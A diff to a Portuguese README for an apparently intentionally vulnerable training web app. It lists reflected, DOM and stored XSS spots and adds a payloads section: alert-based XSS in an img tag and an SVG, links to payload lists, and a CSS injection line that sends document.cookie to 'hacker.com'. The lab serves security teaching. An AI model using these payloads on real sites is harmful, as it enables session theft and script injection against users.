@@ -41,7 +41,6 @@ yarn
 yarn build
 ```
 
-
 ### 4. Abrir o IntelliJ e rodar a aplicação.
 Main Class -> RootApplication.java
 
@@ -78,14 +77,48 @@ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certifi
     - Pesquisa de usuários
 - XSS
     - Reflected
-        - /hello?nome=Gabriel
+        - /hello?nome=Bob
     - DOM
-        - Listagem de POSTS
+        - Filtro na listagem de POSTS
     - Stored
         - Comentários dos posts
 
+## Payloads:
+- XSS
+```html
+<img src="a" onerror="alert('XSS')" />
+```
+https://github.com/payloadbox/xss-payload-list
+https://developer.mozilla.org/pt-BR/docs/Web/JavaScript/Reference/Global_Objects/eval
+
+```html
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+  <script type="text/javascript">
+    alert("XSS");
+  </script>
+</svg>
+```
+- SQL Injection
+
+https://github.com/payloadbox/sql-injection-payload-list
+- CSS Injection
+http://localhost:8080/hello?nome=Gabriel#red;margin-left:50px;background-image:url('http://localhost:8080/favico.ico')
+- expression(document.write('<iframe src=" .= "http://hacker.com?cookie=' + document.cookie.escape() + " />'))
+background-image: url(javascript:alert('XSS'))
+https://www.mediawiki.org/wiki/Preventing_XSS_Attacks_through_CSS_Whitelisting
+
 ## TODO
-- Prevenção de XSS configurável. **DONE**
-- Prevenção de SQL Injection configurável. **DONE**
+- <s>Prevenção de XSS configurável.</s>
+- <s>Prevenção de SQL Injection configurável.</s>
+- <s>Adicionar XSS em SVG e CSS.</s>
 - Validar tipos de autenticação e adicionar Token Opaco.
-- Adicionar XSS em SVG e CSS.
+
+
+## Exemplos de vulnerabilidades:
+- <a href="https://security.snyk.io/vuln/SNYK-JS-MATERIALIZECSS-2324800">XSS materialize-css</a>
+## Referências
+https://developer.mozilla.org/pt-BR/docs/Web/JavaScript/Reference/Global_Objects/eval
